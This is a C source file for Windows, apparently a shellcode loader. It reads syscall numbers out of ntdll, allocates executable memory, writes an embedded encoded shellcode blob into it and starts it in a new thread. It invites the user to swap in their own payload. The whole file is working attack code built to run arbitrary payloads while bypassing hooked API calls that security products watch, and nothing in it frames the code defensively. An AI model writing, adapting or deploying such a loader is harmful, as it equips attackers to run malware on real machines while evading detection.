#include <windows.h>  
#include <stdio.h>    
#include "syscalls.h" 

// Declare global variables to hold syscall numbers
DWORD wNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
DWORD wNtCreateThreadEx;
DWORD wNtWaitForSingleObject;

int main() {
    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)

    // Get a handle to the ntdll.dll library
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");

    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    // Read the syscall number from the NtAllocateVirtualMemory function in ntdll.dll
    // This is typically located at the 4th byte of the function
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];

    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];

    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];

    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];


    // Replace this with your actual shellcode
    unsigned char shellcode[] = "\x89\xe7\xda\xc1\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x7a\x48\x4c\x42\x43\x30\x43\x30\x77\x70\x45\x30\x6c\x49\x49\x75\x45\x61\x59\x50\x43\x54\x4c\x4b\x52\x70\x34\x70\x4c\x4b\x63\x62\x44\x4c\x4c\x4b\x76\x32\x65\x44\x4c\x4b\x72\x52\x64\x68\x34\x4f\x4e\x57\x61\x5a\x46\x46\x66\x51\x39\x6f\x4c\x6c\x55\x6c\x73\x51\x51\x6c\x63\x32\x76\x4c\x57\x50\x4b\x71\x4a\x6f\x56\x6d\x76\x61\x5a\x67\x5a\x42\x48\x72\x70\x52\x66\x37\x4e\x6b\x63\x62\x44\x50\x4c\x4b\x72\x6a\x47\x4c\x4e\x6b\x32\x6c\x37\x61\x70\x78\x68\x63\x37\x38\x47\x71\x78\x51\x56\x31\x4c\x4b\x71\x49\x57\x50\x43\x31\x68\x53\x4e\x6b\x67\x39\x67\x68\x79\x73\x57\x4a\x43\x79\x6e\x6b\x56\x54\x6c\x4b\x77\x71\x4b\x66\x30\x31\x79\x6f\x4c\x6c\x4b\x71\x7a\x6f\x34\x4d\x37\x71\x5a\x67\x36\x58\x4b\x50\x32\x55\x6c\x36\x56\x63\x61\x6d\x39\x68\x67\x4b\x63\x4d\x57\x54\x71\x65\x7a\x44\x76\x38\x6c\x4b\x70\x58\x61\x34\x37\x71\x6a\x73\x75\x36\x4e\x6b\x34\x4c\x70\x4b\x4e\x6b\x63\x68\x67\x6c\x35\x51\x6e\x33\x4e\x6b\x74\x44\x6e\x6b\x36\x61\x4e\x30\x4e\x69\x71\x54\x64\x64\x65\x74\x73\x6b\x43\x6b\x33\x51\x71\x49\x62\x7a\x72\x71\x4b\x4f\x4d\x30\x43\x6f\x71\x4f\x31\x4a\x6c\x4b\x42\x32\x78\x6b\x4c\x4d\x71\x4d\x72\x4a\x55\x51\x4c\x4d\x4d\x55\x68\x32\x55\x50\x73\x30\x65\x50\x36\x30\x72\x48\x34\x71\x6c\x4b\x30\x6f\x6f\x77\x79\x6f\x7a\x75\x6f\x4b\x4a\x50\x6d\x65\x4e\x42\x42\x76\x42\x48\x4c\x66\x5a\x35\x6d\x6d\x6f\x6d\x49\x6f\x4b\x65\x77\x4c\x34\x46\x43\x4c\x55\x5a\x4f\x70\x6b\x4b\x59\x70\x71\x65\x65\x55\x6d\x6b\x61\x57\x37\x63\x50\x72\x72\x4f\x73\x5a\x57\x70\x70\x53\x69\x6f\x39\x45\x63\x53\x30\x61\x32\x4c\x65\x33\x36\x4e\x30\x65\x73\x48\x55\x35\x53\x30\x41\x41";


    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    
    ULONG bytesWritten;
    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

    HANDLE hThread;
    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);

    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
    NtWaitForSingleObject(hThread, FALSE, NULL);
}
